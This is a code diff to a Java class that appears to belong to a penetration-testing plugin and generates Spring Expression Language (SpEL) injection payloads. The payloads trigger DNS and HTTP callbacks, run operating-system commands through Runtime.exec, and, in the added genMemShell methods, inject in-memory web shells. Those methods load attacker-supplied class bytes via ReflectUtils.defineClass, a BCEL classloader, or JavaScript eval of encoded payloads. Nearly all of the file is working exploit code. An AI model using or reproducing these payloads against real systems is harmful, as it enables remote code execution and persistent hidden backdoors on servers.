@@ -1,8 +1,9 @@
 package me.gv7.woodpecker.plugin.exprs;
 
 import me.gv7.woodpecker.plugin.IExpr;
-
-import static me.gv7.woodpecker.plugin.utils.Utils.escape;
+import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
+import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
+import me.gv7.woodpecker.plugin.utils.Utils;
 
 public class SpELExpr implements IExpr {
     @Override
@@ -12,14 +13,14 @@ public class SpELExpr implements IExpr {
 
     @Override
     public String[] genDnslog(String domain) {
-        return new String[]{"#{T(java.net.InetAddress).getByName('" + escape(domain) + "')}"};
+        return new String[]{"#{T(java.net.InetAddress).getByName('" + domain.replace("'", "''") + "')}"};
     }
 
     @Override
     public String[] genHttplog(String url) {
         return new String[]{
-                "#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + escape(url) + "')}",
-                "#{new java.net.URL('" + escape(url) + "').getContent()}"
+                "#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + url.replace("'", "''") + "')}",
+                "#{new java.net.URL('" + url.replace("'", "''") + "').getContent()}"
         };
     }
 
@@ -33,14 +34,40 @@ public class SpELExpr implements IExpr {
     @Override
     public String[] genExec(String command) {
         return new String[]{
-                "#{T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "')}"
+                "#{T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "')}"
         };
     }
 
     @Override
     public String[] genExecWithEcho(String command) {
         return new String[]{
-                "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + escape(command) + "').getInputStream()).useDelimiter('/').next()}"
+                "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "').getInputStream()).useDelimiter('/').next()}"
         };
+    }
+
+    @Override
+    public String[] genMemShell(byte[] memShellClass) {
+        try {
+            return new String[]{
+                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + genSpringMemShell1(memShellClass) + System.lineSeparator() + " <==",
+                    "[+] BCEL方案：==>" + System.lineSeparator() + genSpringMemShell2(memShellClass) + System.lineSeparator() + " <==",
+                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}" + System.lineSeparator() + " <==",
+                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}" + System.lineSeparator() + " <=="
+            };
+        } catch (Exception ex) {
+            return new String[]{
+                    "class文件异常"
+            };
+        }
+    }
+
+    private String genSpringMemShell1(byte[] memShellClass) throws Exception {
+        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BASE64);
+        return "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('" + classFactory.getClassName() + "',T(org.springframework.util.Base64Utils).decodeFromString('" + classFactory.getPayload() + "'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}";
+    }
+
+    private String genSpringMemShell2(byte[] memShellClass) throws Exception {
+        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
+        return "#{new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance()}";
     }
 }
